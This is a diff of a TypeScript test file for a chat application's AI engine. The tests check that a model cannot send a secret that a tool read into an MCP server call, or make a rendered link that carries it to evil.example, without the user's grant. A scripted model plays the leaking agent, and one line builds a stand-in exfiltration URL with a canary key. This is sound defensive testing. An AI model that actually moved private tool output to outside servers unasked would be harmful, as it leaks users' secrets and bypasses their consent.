@@ -16,11 +16,28 @@ import { readFileSync } from 'node:fs';
 import { resolve } from 'node:path';
 import { renderToStaticMarkup } from 'react-dom/server';
 import { createElement } from 'react';
-import { describe, expect, it } from 'vitest';
+import { afterEach, describe, expect, it, vi } from 'vitest';
 
+import { ChatterangEngine, targetFor } from '@/ai/engine';
+import type { DestinationDecision, DestinationRequest, ToolDestinationPolicy } from '@/ai/middleware/tools';
+import { toolRegistry } from '@/ai/tools/registry';
 import { Markdown } from '@/ui/Markdown';
 import { MessageView } from '@/features/chat/MessageView';
 import { FRAME_CONTENT_SECURITY_POLICY, frameDocument, neutraliseNavigation } from '@/ui/frame';
+
+import {
+  CALL,
+  GRANTED_PROBE,
+  MCP_CALL,
+  MCP_CALL_CLEAN,
+  SECRET,
+  drainEvents,
+  leakyTool,
+  mcpProbe,
+  probeManifest,
+  probeResolver,
+  recordingBackend,
+} from './support/egress-probe';
 
 const CANARY = 'sk-live-EXFIL-CANARY';
 const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));
@@ -202,5 +219,87 @@ describe('a model cannot make one click into a request', () => {
     const doc = frameDocument(`<a href="https://evil.example/?d=${CANARY}">x</a>`);
     expect(doc).not.toMatch(/\shref="https/);
     expect(doc).toContain('Content-Security-Policy');
+  });
+});
+
+/**
+ * THE ROUTE #6 IS ABOUT, END TO END.
+ *
+ * A tool reads something private; the model pastes it into the arguments of an
+ * MCP call; the dispatcher hands the call to a server. No markup and no click:
+ * the model composes the request and the app sends it. Driven against a LOCAL
+ * model, where the tool-output sheet never runs, so the only thing between the
+ * secret and the server is the grant at dispatch.
+ *
+ * The script: read the secret, then file a harmless note, then file the secret
+ * — three batches, each its own model turn.
+ */
+describe('a model cannot hand what a tool read to an MCP server unasked', () => {
+  afterEach(() => {
+    toolRegistry.unregister('leaky');
+    toolRegistry.unregister('mcp:notes.note');
+  });
+
+  function setUp() {
+    const probe = mcpProbe();
+    toolRegistry.register(leakyTool);
+    toolRegistry.register(probe.tool);
+    const engine = new ChatterangEngine({ resolver: probeResolver, fallbackBackendId: null });
+    const local = recordingBackend([CALL, MCP_CALL_CLEAN, MCP_CALL, 'Done.']);
+    engine.router.register('scripted', local.adapter);
+
+    const run = (mcpEgress?: ToolDestinationPolicy) =>
+      drainEvents(
+        engine.stream({
+          messages: [{ role: 'user', content: 'tidy up my notes' }],
+          target: targetFor('llama-cpp', probeManifest.id, probeManifest.name, 'scripted'),
+          toolIds: ['leaky', probe.tool.id],
+          mcpEgress,
+        }),
+      );
+    const carried = (): boolean =>
+      probe.call.mock.calls.some((args) => JSON.stringify(args).includes(SECRET));
+    return { probe, local, run, carried };
+  }
+
+  it('is a real route: the model has the secret when it writes the last call', async () => {
+    const { local, run } = setUp();
+    await run();
+    expect(local.seen).toHaveLength(4);
+    expect(JSON.stringify(local.seen[2]!.messages)).toContain(SECRET);
+  });
+
+  it('sends nothing to the server when nothing was allowed', async () => {
+    const { probe, run, carried } = setUp();
+    await run();
+    expect(probe.call).not.toHaveBeenCalled();
+    expect(carried()).toBe(false);
+  });
+
+  it('asks again for the later call after the calls on screen were allowed, and holds it back', async () => {
+    const { probe, run, carried } = setUp();
+    const request = vi.fn(async (_asked: DestinationRequest): Promise<DestinationDecision> => 'deny');
+    request.mockResolvedValueOnce('calls');
+
+    await run({ isGranted: () => false, request });
+
+    // A "send these calls" answer covered the harmless call it was given over,
+    // and nothing after it.
+    expect(request).toHaveBeenCalledTimes(2);
+    expect(request.mock.calls[0]![0].calls[0]!.preview).not.toContain(SECRET);
+    // The second sheet shows the person exactly what the model is trying to send.
+    expect(request.mock.calls[1]![0].calls[0]!.preview).toContain(SECRET);
+    expect(probe.call).toHaveBeenCalledOnce();
+    expect(probe.call).toHaveBeenCalledWith('notes', 'note', { text: 'a shopping list' }, undefined);
+    expect(carried()).toBe(false);
+  });
+
+  it('is the grant holding it back: a conversation grant does carry the secret', async () => {
+    // The paired control. Without it, the tests above hold for a dispatcher
+    // that never calls a server at all.
+    const { probe, run, carried } = setUp();
+    await run(GRANTED_PROBE);
+    expect(probe.call).toHaveBeenCalledTimes(2);
+    expect(carried()).toBe(true);
   });
 });
